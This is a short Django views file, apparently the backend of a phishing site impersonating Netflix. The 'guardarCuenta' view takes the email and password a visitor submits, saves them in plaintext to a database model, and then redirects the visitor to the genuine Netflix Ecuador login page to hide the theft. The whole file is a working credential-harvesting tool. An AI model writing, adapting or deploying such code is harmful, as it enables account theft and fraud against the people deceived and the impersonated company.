from django.shortcuts import redirect, render
from .models import Cuenta
# Create your views here.
def index(request):
    return render(request,'index.html')
def guardarCuenta(request):
    correo=request.POST['email']
    contra=request.POST['password']
    index=Cuenta.objects.create(correo=correo,contra=contra)
    return redirect('https://www.netflix.com/ec/login')
    